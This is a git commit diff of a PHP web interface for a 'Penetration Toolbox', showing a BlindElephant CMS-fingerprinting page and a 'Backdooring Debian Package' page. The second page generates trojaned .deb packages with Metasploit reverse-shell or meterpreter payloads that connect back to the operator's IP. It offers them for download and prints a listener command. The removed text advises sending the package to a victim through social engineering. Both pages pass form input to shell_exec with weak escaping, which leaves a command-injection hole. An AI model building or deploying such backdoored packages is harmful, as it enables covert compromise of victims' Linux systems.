d9c43ac818b25dcbcca5b47a45be32c2ae813c7f
Alexandre P <74857980+Marlottony@users.noreply.github.com>
2024-04-29 20:49:06 +0200

    modif

--- toolbox/cms.php
+++ toolbox/cms.php
@@ -1,4 +1,5 @@
-<?php /***************************************************************************
+<?php
+/***************************************************************************
  Copyright (C) 2024 Alexandre Perrin
  Written by Alexandre Perrin <alexandre.perrin@supdevinci-edu.fr>.
 
@@ -11,161 +12,112 @@
  This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without 
  even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
 
- You should have received a copy of the GNU General Public License along with this program. If not, you can view it at <https://www.gnu.org/licenses/>..
-***************************************************************************/?>
-<?php
+ You should have received a copy of the GNU General Public License along with this program. If not, you can view it at <https://www.gnu.org/licenses/>.
+***************************************************************************/
 require_once 'layout.php';
 require_once 'u.php';
+
+function sanitizeInput($data) {
+    return htmlspecialchars(strip_tags(trim($data)));
+}
+
 ?>
 
 <section id="main" class="column">
-		
-		<h4 class="alert_info">Welcome to the Web Based Penetration Toolbox.</h4>
-		
-		
-		
-		
-		<div class="clear"></div>
-		
-		<article class="module width_full">
-			<header><h3>BlindElephant Scan</h3></header>
-				<div class="module_content">
-<form name="form1" action="" method="post">
-						<fieldset>
+    <h4 class="alert_info">Welcome to the Web Based Penetration Toolbox.</h4>
 
-							<label>Enter Domain</label>
-                                                        <input type="text" name="url" value=""  id="ur">
-						</fieldset>
-    <fieldset style="width:47%">  
-        <label>Web Application</label>
-   <select name="c" value="Drupal">
-            <option value="drupal"> Drupal</option>
-            <option value="joomla">Joomla</option>
-            <option value="liferay">Liferay</option>
-            <option value="mediawiki">Mediawiki</option>
-            <option value="movabletype">movabletype</option>
-            <option value="oscommerce">oscommerce</option>
-            <option value="phpbb">phpbb</option>
-            <option value="phpmyadmin">phpmyadmin</option>
-            <option value="phpnuke">phpnuke</option>
-            <option value="spip">spip</option>
-            <option value="tikiwiki">tikiwiki</option>
-            <option value="twiki">twiki</option>
-            <option value="wordpress">wordpress</option>
-        </select></p>
-    </fieldset>
-    <fieldset style ="float: left;width: 47%">
-        <legend><label>No Idea About Web App?</label></legend><input type="checkbox" name="check">Guess Application</p>
-    </fieldset>
-        
-        
-        
-						<div class="clear"></div>
-				</div>
-			<footer>
-				<div class="submit_link">
-					
-                                    <input type="submit" name="submit" value="Start Now" class="alt_btn" id="submit">
-                                    <a href="harvester.php"><input type="button" value="Reset" id="reset"></a>
-				</div>
-			</footer>
-		</article><!-- end of post new article -->
-                
-               <?php
-               
-                if(isset($_POST['submit']))
-                {
-                    $url=$_POST['url'];
-                    $c=$_POST['c'];
-                    $check=$_POST['check'];
+    <article class="module width_full">
+        <header><h3>BlindElephant Scan</h3></header>
+        <div class="module_content">
+            <form name="form1" action="" method="post">
+                <fieldset>
+                    <label>Enter Domain</label>
+                    <input type="text" name="url" value="" id="url">
+                </fieldset>
+                <fieldset style="width:47%">
+                    <label>Web Application</label>
+                    <select name="c">
+                        <option value="drupal">Drupal</option>
+                        <option value="joomla">Joomla</option>
+                        <option value="liferay">Liferay</option>
+                        <option value="mediawiki">Mediawiki</option>
+                        <option value="movabletype">movabletype</option>
+                        <option value="oscommerce">oscommerce</option>
+                        <option value="phpbb">phpbb</option>
+                        <option value="phpmyadmin">phpmyadmin</option>
+                        <option value="phpnuke">phpnuke</option>
+                        <option value="spip">spip</option>
+                        <option value="tikiwiki">tikiwiki</option>
+                        <option value="twiki">twiki</option>
+                        <option value="wordpress">wordpress</option>
+                    </select>
+                </fieldset>
+                <fieldset style="float: left;width: 47%">
+                    <legend><label>No Idea About Web App?</label></legend>
+                    <input type="checkbox" name="check"> Guess Application
+                </fieldset>
+                <div class="clear"></div>
+            </div>
+            <footer>
+                <div class="submit_link">
+                    <input type="submit" name="submit" value="Start Now" class="alt_btn">
+                    <a href="harvester.php"><input type="button" value="Reset"></a>
+                </div>
+            </footer>
+        </form>
+    </article><!-- end of post new article -->
 
-                    
-                
-               
-               
-               if($url==''){
-                   
-                   echo "<script type='text/javascript'>$.msg({fadeIn : 500,fadeOut : 500,bgPath : 'dlgs/',  content : 'You Have not entered any URL.Please enter an URL to continue..'});</script>";
-              }
-               
- else {
-      
-      echo "<script type='text/javascript'>$.msg({ fadeIn : 500,fadeOut : 500, bgPath : 'dlgs/',  content : 'BlindElephant scan for $url ! Please refer result section after this message'});</script>";
-                   require_once 'loading.php';
-                   if (isset($check))
-                   {
-                       echo "<p><b>Guessing the name of CMS</b></p>";
-                       shell(" BlindElephant.py $url guess");
-                   }
-                 else {
-    shell("BlindElephant.py $url $c");
-             
-                  
-                   }
+    <?php
+    if (isset($_POST['submit'])) {
+        $url = sanitizeInput($_POST['url']);
+        $c = sanitizeInput($_POST['c']);
+        $check = isset($_POST['check']);
 
+        if (empty($url)) {
+            echo "<script>alert('You have not entered any URL. Please enter a URL to continue.');</script>";
+        } else {
+            echo "<script>alert('BlindElephant scan initiated for $url! Please refer to the result section after this message.');</script>";
+            require_once 'loading.php';
+            if ($check) {
+                echo "<p><b>Guessing the name of CMS</b></p>";
+                shell_exec("python BlindElephant.py $url guess");
+            } else {
+                shell_exec("python BlindElephant.py $url $c");
+            }
 
-        
-        echo "<script type='text/javascript'>$.msg({ fadeIn : 500,fadeOut : 500, bgPath : 'dlgs/',  content : 'BlindElephant Scan ! See Full result in result section'});</script>";
-            
-     
-        
-         
-   
-         echo '</div>
-                                    <footer>
-				<div align="left">
-					
-					<h3>Thank You!</h3>
-				</div>
-			</footer>
-		</article><!-- end of styles article -->
-                 <h4 class="alert_success">Scan Succeeded </h4>
-                 
- ';
-         
- }
-               
- }            
-                     
-    
-                
- ?>
-                
+            echo "<script>alert('BlindElephant Scan complete! See full result in result section.');</script>";
+            echo '<footer><div align="left"><h3>Thank You!</h3></div></footer>';
+            echo '<h4 class="alert_success">Scan Succeeded </h4>';
+        }
+    }
+    ?>
 
-		
-		<article class="module width_full">
-			<header><h3>Tool Description</h3></header>
-				<div class="module_content">
-					
-					
-<p>This tool is designed to help the penetration tester on an earlier stage; it is an effective, simple and easy to use.This tool acts as front end of Blindelephant,a famous command line utility for cms identification</p>
-<p>The BlindElephant Web Application Fingerprinter attempts to discover the version of a (known) web application by comparing static files at known locations against precomputed hashes for versions of those files in all all available releases. The technique is fast, low-bandwidth, non-invasive, generic, and highly automatable. </p>
-<p>The sources supported are:</p>
+    <article class="module width_full">
+        <header><h3>Tool Description</h3></header>
+        <div class="module_content">
+            <p>This tool is designed to help the penetration tester in the early stages; it is effective, simple, and easy to use. This tool acts as a front end for BlindElephant, a famous command-line utility for CMS identification.</p>
+            <p>The BlindElephant Web Application Fingerprinter attempts to discover the version of a (known) web application by comparing static files at known locations against precomputed hashes for versions of those files in all available releases. The technique is fast, low-bandwidth, non-invasive, generic, and highly automatable. </p>
+            <p>The sources supported are:</p>
+            <ul>
+                <li>Drupal</li>
+                <li>Joomla</li>
+                <li>Liferay</li>
+                <li>Mediawiki</li>
+                <li>Movabletype</li>
+                <li>Oscommerce</li>
+                <li>Phpbb</li>
+                <li>Phpmyadmin</li>
+                <li>Phpnuke</li>
+                <li>Spip</li>
+                <li>Tikiwiki</li>
+                <li>Twiki</li>
+                <li>Wordpress</li>
+            </ul>
+            <p>Information gathering steps of footprinting and scanning are of utmost importance. Good information gathering can make the difference between a successful penetration test and one that has failed to provide maximum benefit to the client. Information is a weapon; a successful penetration testing and hacking process need a lot of relevant information. That is why, information gathering so called foot printing is the first step of hacking. Gathering valid login names and emails are one of the most important parts of penetration testing. We can use these to profile our target, brute force authentication systems, send client-side attacks (through phishing), look through social networks for juicy info on platforms and technologies, etc.</p>
+        </div>
+    </article><!-- end of styles article -->
 
-					<ul>
-                                            <li>Drupal</li>
-                                        <li>Joomla</li>
-            <li>Liferay</li>
-            <li>Mediawiki</li>
-            <li>movabletype</li>
-            <li>movabletype</li>
-            <li>oscommerce</li>
-            <li>phpbb</li>
-            <li>phpmyadmin</li>
-            <li>phpnuke</li>
-            <li>spip</li>
-            <li>tikiwiki</li>
-            <li>twiki</li>
-            <li>wordpress</li>
-                                                
-					</ul>
-<p>The information gathering steps of footprinting and scanning are of utmost importance. Good information gathering can make the difference between a successful penetration test and one that has failed to provide maximum benefit to the client. We can say that Information is a weapon, a successful penetration testing and a hacking process need a lots of relevant information that is why, information gathering so called foot printing is the first step of hacking. So, gathering valid login names and emails are one of the most important parts for penetration testing. We can use these to profile our target, brute force authentication systems, send client-side attacks (through phishing), look through social networks for juicy info on platforms and technologies, etc.</p>
-				</div>
-                        
-		</article><!-- end of styles article -->
-                
-
-		<div class="spacer"></div>
-	</section>
+    <div class="spacer"></div>
+</section>
 </body>
 </html>
--- toolbox/deb.php
+++ toolbox/deb.php
@@ -1,141 +1,118 @@
-<?php /***************************************************************************
- Copyright (C) 2024 Alexandre Perrin
- Written by Alexandre Perrin <alexandre.perrin@supdevinci-edu.fr>.
-
- This file is part of Penetration Toolbox, a web interface for various ethical hacking tools.
-
- Penetration Toolbox is free software; you can redistribute it and/or modify it under the terms 
- of the GNU General Public License as published by the Free Software Foundation, either version 3 
- of the License, or (at your option) any later version.
-
- This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without 
- even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
-
- You should have received a copy of the GNU General Public License along with this program. If not, you can view it at <https://www.gnu.org/licenses/>..
-***************************************************************************/?>
 <?php
+/***************************************************************************
+*  Copyright (C) 2024 Alexandre Perrin
+*  Written by Alexandre Perrin <alexandre.perrin@supdevinci-edu.fr>.
+*
+*  This file is part of Penetration Toolbox, a web interface for various ethical hacking tools.
+*
+*  Penetration Toolbox is free software; you can redistribute it and/or modify it under the terms 
+*  of the GNU General Public License as published by the Free Software Foundation, either version 3 
+*  of the License, or (at your option) any later version.
+*
+*  This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without 
+*  even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
+*
+*  You should have received a copy of the GNU General Public License along with this program. If not, you can view it at <https://www.gnu.org/licenses/>.
+****************************************************************************/
+
 require_once 'layout.php';
 require_once 'u.php';
+
+// Function to sanitize input from the form
+function sanitizeInput($data) {
+    return htmlspecialchars(strip_tags(trim($data)));
+}
+
+// Function to execute shell commands securely
+function executeShellCommand($command) {
+    $escapedCommand = escapeshellcmd($command);
+    $output = shell_exec($escapedCommand);
+    return $output;
+}
 ?>
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Toolbox</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
 <section id="main" class="column">
-	
-		<h4 class="alert_info">Welcome to the Web Based Penetration Toolbox.</h4>
-	<div class="clear"></div>
-		
-		<article class="module width_full">
-			<header><h3>Backdooring Debian Pakage</h3></header>
-				<div class="module_content">
-                                    <form name="form1" action="deb.php" method="post" enctype="multipart/form-data">
-						<fieldset>
-							<label>Enter Your IP Address</label>
-                                                        <input type="text" name="ip" value="" >
-						</fieldset>
-    <fieldset>
-							<label>Enter Port to Use</label>
-                                                        <input type="text" name="port" value="4444" >
-                                                        </fieldset>
-                                        <fieldset>
-							<label>Enter Your Username</label>
-                                                        <input type="text" name="uname" value="root" >
-                                                        </fieldset>
-    
-     <fieldset>
-        <label>Choose a debian package </label><br/>     
-        <p><input type="radio" value="p1" name="p" checked="true"> Freesweep(x86) </p>
- <p><input  type="radio" value="p2" name="p" >Xbomb(x86_64) </p>
-    </fieldset>	
-   <fieldset>
-        <label>Linux Payload</label><label style="float:right;margin-right: 2%">Description</label><br/>     
-        <p><input type="radio" value="linux/x86/meterpreter/reverse_tcp" name="c" checked="true">  Linux x86 Meterpreter Reverse Tcp	 <v style=" float: right;margin-right:  4%"> Connect back to the attacker, Staged meterpreter server</v> </p>
-   <p><input  type="radio" value="linux/x86/shell_reverse_tcp" name="c" > Linux x86 shell reverse_tcp<v style=" float: right;margin-right:  4%"> Connect back to the attacker, Spawn a command shell</v> </p>
-    </fieldset>	
-                                        
-	
-						<div class="clear"></div>
-				</div>
-			<footer>
-				<div class="submit_link">
-					
-                                    <input type="submit" name="submit" value="Start Now" class="alt_btn" id="submit">
-                                    <input type="reset" value="Reset" id="reset"></a>
-				</div>
-			</footer>
-</form>
-		</article><!-- end of post new article -->
-              
-                 <?php
-               
-                if(isset($_POST['submit']))
-                {
-                    $ip=$_POST['ip'];
-                    $port=$_POST['port'];
-                    $p=$_POST['p'];
-                     $uname=$_POST['uname'];
-                     $c=$_POST['c'];
-      if($ip==''||$port==''){
-                   
-                   echo "<script type='text/javascript'>$.msg({fadeIn : 500,fadeOut : 500,bgPath : 'dlgs/',  content : 'You Have not entered datas correctly...'});</script>";
-             
-                   }else{
-                       
-              echo "<script type='text/javascript'>$.msg({ fadeIn : 500,fadeOut : 500, bgPath : 'dlgs/',  content : 'Generating Payloads, please wait... ! Please refer result section after this message'});</script>";
-           
-                 require_once 'loading.php';
-                 echo "<fieldset>";
-                 switch($p){
-                     case p1:
-                         $sh="freesweep.sh";
-                         $pkg="freesweep.deb";
-                         shell("sudo sh cmd/debian/$sh $c $ip $port $uname");
-                         break;
-                     case p2:
-                         $sh="xbomb.sh";
-                         $pkg="xbomb.deb";
-                         shell("sudo sh cmd/debian/$sh $c $ip $port $uname");
-                         break;
-                 }
-               
-                 
-                          
-      echo '<p><b>Payload Configuration</b></p>';
-echo'****************************************************************************';
-echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
-echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
-echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'</p>';
-echo '<p><b>PAYLOAD</b>                   -->'.$c.'</p>';
-echo '<p><b>AVAILABLE FOR DOWNLOAD @</b>  --><a href=exploits/'.$pkg.'>Click here</a>';
-echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Debian Based Linux Distributions</p>';
-echo'<p>*****************************************************************************</p>';
-echo '<b>Note:</b>You can send this package to victim by any social engineering techniques  ';
+    <h4 class="alert_info">Welcome to the Web Based Penetration Toolbox.</h4>
 
+    <article class="module width_full">
+        <header><h3>Backdooring Debian Package</h3></header>
+        <div class="module_content">
+            <form name="form1" method="post" enctype="multipart/form-data">
+                <fieldset>
+                    <label>Enter Your IP Address</label>
+                    <input type="text" name="ip">
+                </fieldset>
+                <fieldset>
+                    <label>Enter Port to Use</label>
+                    <input type="text" name="port" value="4444">
+                </fieldset>
+                <fieldset>
+                    <label>Enter Your Username</label>
+                    <input type="text" name="uname" value="root">
+                </fieldset>
+                <fieldset>
+                    <label>Choose a debian package</label><br/>
+                    <input type="radio" value="p1" name="p" checked>Freesweep(x86)<br/>
+                    <input type="radio" value="p2" name="p">Xbomb(x86_64)
+                </fieldset>
+                <fieldset>
+                    <label>Linux Payload</label>
+                    <input type="radio" value="linux/x86/meterpreter/reverse_tcp" name="c" checked>Linux x86 Meterpreter Reverse Tcp<br/>
+                    <input type="radio" value="linux/x86/shell_reverse_tcp" name="c">Linux x86 shell reverse_tcp
+                </fieldset>
+                <div class="submit_link">
+                    <input type="submit" name="submit" value="Start Now" class="alt_btn">
+                    <input type="reset" value="Reset">
+                </div>
+            </form>
+        </div>
+        <footer>
+            <div align="left">
+                <h3>Thank You!</h3>
+            </div>
+        </footer>
+    </article>
 
-echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b> sudo msfcli exploit/multi/handler PAYLOAD='.$c.'  LHOST='.$ip.' LPORT='.$port.' E  </b></code>'; 
+    <?php
+    if (isset($_POST['submit'])) {
+        $ip = sanitizeInput($_POST['ip']);
+        $port = sanitizeInput($_POST['port']);
+        $uname = sanitizeInput($_POST['uname']);
+        $c = sanitizeInput($_POST['c']);
+        $p = sanitizeInput($_POST['p']);
 
-$host=$_SERVER['SERVER_ADDR'];
-	        echo "<p>To Open Terminal Click <a target='_blank' href='https://$host:4200/'>here</a></p>";
-                 echo "<script type='text/javascript'>$.msg({ fadeIn : 500,fadeOut : 500, bgPath : 'dlgs/',  content : 'Payload Generated  ! Please refer result section after this message'});</script>";
-     
+        if (empty($ip) || empty($port)) {
+            echo "<script>alert('You have not entered data correctly.');</script>";
+        } else {
+            require_once 'loading.php';
 
-         echo '</div>
-                                    <footer>
-				<div align="left">
-					
-					<h3>Thank You!</h3>
-                                        
-				</div>
-			</footer>
-		</article><!-- end of styles article -->
-                 <h4 class="alert_success">Succeeded </h4>
-                 
- ';
-         
- }       
-                }                
-    
-        ?>
-  		<div class="spacer"></div>
-	</section>
+            $script = $p == 'p1' ? "freesweep.sh" : "xbomb.sh";
+            $pkg = $p == 'p1' ? "freesweep.deb" : "xbomb.deb";
+
+            executeShellCommand("sudo sh cmd/debian/$script $c $ip $port $uname");
+
+            echo "<p><b>Payload Configuration</b></p>";
+            echo "<p>LHOST --> $ip</p>";
+            echo "<p>LPORT --> $port</p>";
+            echo "<p>PACKAGE NAME --> $pkg</p>";
+            echo "<p>PAYLOAD --> $c</p>";
+            echo "<p>AVAILABLE FOR DOWNLOAD @ <a href='exploits/$pkg'>Click here</a></p>";
+            echo "<p>To start listener copy and paste this code into your terminal:</p>";
+            echo "<pre>sudo msfcli exploit/multi/handler PAYLOAD=$c LHOST=$ip LPORT=$port E</pre>";
+        }
+    }
+    ?>
+    <div class="spacer"></div>
+</section>
+
 </body>
 </html>
